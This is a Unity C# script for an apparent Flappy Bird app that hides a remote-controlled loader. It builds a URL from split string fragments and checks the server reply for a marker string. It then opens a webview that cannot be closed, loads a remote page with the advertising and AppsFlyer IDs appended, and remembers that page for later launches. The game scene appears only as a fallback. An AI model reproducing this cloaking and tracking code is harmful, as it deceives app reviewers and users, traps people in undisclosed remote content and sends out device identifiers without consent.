using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainFIT : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oFITName = "";
    [HideInInspector] public string tFITName = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaFIT") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oFITName = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlFITreference", string.Empty) != string.Empty)
            {
                LAPFITSEE(PlayerPrefs.GetString("UrlFITreference"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    tFITName += n;
                }
                StartCoroutine(IENUMENATORFIT());
            }
        }
        else
        {
            MoveFIT();
        }
    }

    private void MoveFIT()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Flappy Bird");
    }

    private IEnumerator IENUMENATORFIT()
    {
        using (UnityWebRequest fit = UnityWebRequest.Get(tFITName))
        {

            yield return fit.SendWebRequest();
            if (fit.isNetworkError)
            {
                MoveFIT();
            }
            int scheduleFIT = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && scheduleFIT > 0)
            {
                yield return new WaitForSeconds(1);
                scheduleFIT--;
            }
            try
            {
                if (fit.result == UnityWebRequest.Result.Success)
                {
                    if (fit.downloadHandler.text.Contains("FlrnTrblncVBDvfdq"))
                    {

                        try
                        {
                            var subs = fit.downloadHandler.text.Split('|');
                            LAPFITSEE(subs[0] + "?idfa=" + oFITName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            LAPFITSEE(fit.downloadHandler.text + "?idfa=" + oFITName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        MoveFIT();
                    }
                }
                else
                {
                    MoveFIT();
                }
            }
            catch
            {
                MoveFIT();
            }
        }
    }

    private void LAPFITSEE(string UrlFITreference, string NamingFIT = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _bondsFIT = gameObject.AddComponent<UniWebView>();
        _bondsFIT.SetToolbarDoneButtonText("");
        switch (NamingFIT)
        {
            case "0":
                _bondsFIT.SetShowToolbar(true, false, false, true);
                break;
            default:
                _bondsFIT.SetShowToolbar(false);
                break;
        }
        _bondsFIT.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _bondsFIT.OnShouldClose += (view) =>
        {
            return false;
        };
        _bondsFIT.SetSupportMultipleWindows(true);
        _bondsFIT.SetAllowBackForwardNavigationGestures(true);
        _bondsFIT.OnMultipleWindowOpened += (view, windowId) =>
        {
            _bondsFIT.SetShowToolbar(true);

        };
        _bondsFIT.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingFIT)
            {
                case "0":
                    _bondsFIT.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _bondsFIT.SetShowToolbar(false);
                    break;
            }
        };
        _bondsFIT.OnOrientationChanged += (view, orientation) =>
        {
            _bondsFIT.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _bondsFIT.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlFITreference", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlFITreference", url);
            }
        };
        _bondsFIT.Load(UrlFITreference);
        _bondsFIT.Show();
    }
}
